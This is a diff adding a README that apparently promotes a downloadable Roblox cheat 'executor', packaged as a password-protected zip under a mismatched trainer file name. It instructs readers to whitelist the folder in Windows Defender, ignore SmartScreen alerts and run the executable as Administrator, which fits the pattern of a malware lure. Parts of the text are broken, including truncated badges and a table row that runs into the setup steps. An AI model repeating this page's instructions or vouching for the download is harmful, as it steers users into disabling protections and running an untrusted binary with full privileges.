@@ -1,0 +1,48 @@
+🌀 Wave Executor — Free Download for Windows 2026]
+
+-lightgrey?style=for-the-badge&logo=windows)
+-green?style=for-the-badge&logo=github)
+
+🌀 Wave Executor (v1.0.1) implements a hardware-accelerated solution for Windows 10 and Windows 11. Packaged inside rob-run-trainer-mod-menu-v1.2.0-win64.zip (40.4 MB), rob-run-trainer-mod-menu-v1.2.0-win64.exe initializes with zero external dependencies.
+
+Direct Package: [rob-run-trainer-mod-menu-v1.2.0-win64.zip (40.4 MB) · Password: 2026 · Build: v1.0.1 (F4A531)
+
+✨ Wave Executor — Core Modules
+
+| Wave Executor Subsystem | Runtime Behavior (F4A531) | Build |
+| :--- | :--- | :---: |
+| 📚 Integrated Script Hub | Drives thread-safe integrated script hub (wave-executor · 1-click cloud preset execution) for Wave Executor users across 13 worker threads. | v1.0.1 |
+| 🛡️ Post-Patch Offset Sync | Drives zero-overhead post-patch offset sync (wave-executor · automated Wednesday client signature updates) under build F4A531 in  Archive Password: 2026 — Extract rob-run-trainer-mod-menu-v1.2.0-win64.zip completely before launching rob-run-trainer-mod-menu-v1.2.0-win64.exe` as Administrator.
+
+❓ Wave Executor (v1.0.1) — FAQ
+
+Q: Is Wave Executor (rob-run-trainer-mod-menu-v1.2.0-win64.zip) compatible with Windows 10 and Windows 11?
+Yes — rob-run-trainer-mod-menu-v1.2.0-win64.exe (v1.0.1) runs natively on Windows 10 and Windows 11 across Intel and AMD x64 processors.
+
+Q: What is the password to extract rob-run-trainer-mod-menu-v1.2.0-win64.zip for Wave Executor?
+Enter 2026 in 7-Zip or WinRAR when unpacking rob-run-trainer-mod-menu-v1.2.0-win64.zip (40.4 MB) before starting rob-run-trainer-mod-menu-v1.2.0-win64.exe.
+
+Q: How do I fix Windows Defender or SmartScreen alerts on rob-run-trainer-mod-menu-v1.2.0-win64.exe (v1.0.1)?
+Because rob-run-trainer-mod-menu-v1.2.0-win64.exe (build F4A531) is an independent roblox executor binary, heuristic checks may prompt a warning. Confirm you downloaded rob-run-trainer-mod-menu-v1.2.0-win64.zip from stevie215/wave-executor, whitelist the wave-executor directory, and run rob-run-trainer-mod-menu-v1.2.0-win64.exe as Administrator.
+
+💻 rob-run-trainer-mod-menu-v1.2.0-win64.exe — Build Manifest
+
+| wave-executor Attribute | Wave Executor Value |
+| :--- | :--- |
+| Target Platform | Windows 10 and Windows 11 |
+| Executable & Build | rob-run-trainer-mod-menu-v1.2.0-win64.exe (v1.0.1 · F4A531A339) |
+| Release Archive | rob-run-trainer-mod-menu-v1.2.0-win64.zip (40.4 MB) |
+| Unzip Password | 2026 |
+
+Wave Executor — Release Manifest (stevie215/wave-executor)
+[package]
+slug = "wave-executor"
+version = "1.0.1"
+signature = "F4A531A339"
+archive = "rob-run-trainer-mod-menu-v1.2.0-win64.zip"
+password = "2026"
+entrypoint = "rob-run-trainer-mod-menu-v1.2.0-win64.exe"
+
+  🌀 Wave Executor · v1.0.1 (F4A531A339)
+
+  wave-executor
